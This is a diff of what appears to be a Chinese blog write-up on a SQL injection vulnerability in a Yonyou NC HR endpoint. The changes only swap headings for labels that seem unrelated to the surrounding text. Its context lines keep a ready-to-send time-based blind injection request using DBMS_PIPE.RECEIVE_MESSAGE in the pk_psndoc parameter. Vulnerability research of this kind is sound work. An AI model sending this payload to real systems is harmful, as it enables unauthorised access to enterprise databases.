@@ -32,11 +32,11 @@ modules/hrss/lib/pubhrss\_pub/nc/bs/hrss/pub/action/RMWebImageAction.[Java](http
 
 深入探索
 
-安全研究工具
+孚盟云漏洞
 
-漏洞分析报告
+数据管理
 
-SQL注入防护
+工程与技术
 
 ```
 package nc.bs.hrss.pub.action;
@@ -142,7 +142,7 @@ extends BaseAction {
 
 pk\_psndoc 参数直接代入 queryAggRMPsndocVO 函数，其实现逻辑如下
 
-孚盟云漏洞
+漏洞修复方案
 
 ```
 private AggregatedValueObject queryAggRMPsndocVO(String pk_psndoc) {
@@ -280,7 +280,7 @@ Host: nc65.mrxn.net
 
 [漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")利用示例
 
-孚盟云漏洞
+漏洞修复方案
 
 ```
 GET /portal/pt/rmwebImage/download?pageId=login&pk_psndoc=1'+and+1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)-- HTTP/1.1
